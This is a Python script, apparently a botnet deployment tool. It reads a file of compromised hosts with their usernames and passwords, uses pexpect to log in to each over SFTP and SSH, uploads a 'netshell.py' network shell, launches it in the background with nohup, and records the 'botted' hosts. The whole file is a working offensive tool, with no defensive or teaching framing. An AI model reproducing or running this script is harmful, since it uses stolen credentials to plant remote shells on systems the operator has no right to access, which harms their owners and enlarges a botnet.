#!/usr/bin/python3

import pexpect
import sys

def install_bot(ip, username, password):
    try:
        # SFTP to upload the bot script
        sftp_command = f"sftp {username}@{ip}"
        sftp = pexpect.spawn(sftp_command)
        # Wait for the password prompt
        sftp.expect(f"{username}@{ip}'s password:")
        sftp.sendline(password)
        sftp.expect("sftp>")  # Expect sftp prompt
        sftp.sendline('put netshell.py')  # Uploading the network shell script
        sftp.expect("sftp>")  # Expect sftp prompt
        sftp.sendline('exit')  # Exit SFTP
        print(f"Script uploaded to {ip}")

        # SSH to start the shell in the background
        ssh_command = f"ssh {username}@{ip}"
        ssh = pexpect.spawn(ssh_command)
        # Wait for the password prompt
        ssh.expect(f"{username}@{ip}'s password:")
        ssh.sendline(password)

        # Generalized prompt expectation
        ssh.expect(r"[$#>]\s*")  # This matches common prompt styles (including # for root)

        # Run the bot script in the background with nohup and log output
        ssh.sendline("nohup python3 netshell.py &")  # Start bot in background
        ssh.expect(r"\[\d+\]")  # Expect the job number from nohup (e.g., [1])
        ssh.sendline()  # Press Enter to ensure prompt is returned
        ssh.expect(r"[$#>]\s*")  # Expect shell prompt after job is started

        # Exit SSH session
        ssh.sendline("exit")
        print(f"Shell started on {ip}")
        return True  # Return success

    except pexpect.exceptions.TIMEOUT as e:
        print(f"Timeout error with {ip}: {e}")
    except pexpect.exceptions.EOF as e:
        print(f"EOF error with {ip}: {e}")
    except Exception as e:
        print(f"Error with {ip}: {e}")
    
    return False  # Return failure if any exception occurs


def main():
    try:
        with open("compromised_hosts.txt", "r") as file:
            lines = file.readlines()
            print("Read compromised_hosts.txt")
            print("Installing bot on the following hosts:")
            hosts = []
            for line in lines:
                ip, username, password = line.split()
                hosts.append((ip, username, password))
                print(f"{ip} - {username}")

            # Iterating over each host and attempting the installation
            for ip, username, password in hosts:
                print(f"executing:  sftp {username}@{ip}")
                success = install_bot(ip, username, password)
                if success:
                    with open("botted_hosts.txt", "a") as botted_file:
                        botted_file.write(f"{ip}\n")
                    print('"botted_hosts.txt" written')  # Print confirmation after writing
                else:
                    print(f"Failed to install bot on {ip}")

    except FileNotFoundError:
        print("Error: compromised_hosts.txt file not found.")
    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
